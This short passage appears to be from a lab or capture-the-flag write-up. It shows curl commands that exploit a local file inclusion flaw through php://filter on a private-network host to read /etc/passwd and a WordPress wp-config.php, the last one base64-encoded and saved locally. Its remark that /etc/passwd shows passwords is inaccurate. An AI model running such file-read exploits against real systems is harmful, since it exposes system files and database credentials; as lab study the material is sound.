
```c
curl "172.16.1.10/nav.php?page=php://filter/read=/resource=/etc/passwd"
```
This can show the passwords, lets check the wp-config.php file too....
```c
curl "172.16.1.10/nav.php?page=php://filter/read=/resource=/var/www/html/wordpress/wp-config.php"
```

```c
curl "172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php"| base64 -d > wp-config.php
```
Had to do the base64, just reading didnt work....